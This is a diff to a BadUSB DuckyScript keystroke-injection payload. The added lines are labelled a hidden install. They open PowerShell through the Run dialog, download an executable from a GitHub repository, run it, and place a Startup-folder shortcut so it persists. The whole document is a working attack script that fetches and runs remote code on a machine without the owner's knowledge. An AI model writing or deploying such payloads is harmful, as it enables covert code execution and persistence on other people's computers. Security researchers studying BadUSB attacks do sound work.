@@ -1,11 +1,27 @@
-REM Hello
+REM Hidden install of python exe
 DEFAULT_DELAY 200
 
 REM open terminal
-GUI x
+GUI r
 DELAY 500
-STRING i
+STRING powershell
+ENTER
+DELAY 500
+
+STRING cd \
+ENTER
 DELAY 500
 
 REM Install file
-STRING sudo wget "link"
+STRING powershell -Command "Invoke-WebRequest -Uri 'https://github.com/SuperNinjaCat5/BadUsb_DuckyScript/raw/refs/heads/main/python_setup/dist/main.exe' -OutFile '$env:USERPROFILE\\Downloads\\main.exe'"
+ENTER
+DELAY 500
+STRING cd $env:USERPROFILE\Downloads
+ENTER
+DELAY 250
+STRING ./main.exe
+ENTER
+
+REM Add to startup REMOVE FOR TESTING
+STRING $sc="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\MyApp.lnk";$tg="$env:USERPROFILE\Downloads\main.exe";$sh=New-Object -ComObject WScript.Shell;$s=$sh.CreateShortcut($sc);$s.TargetPath=$tg;$s.Save()
+ENTER
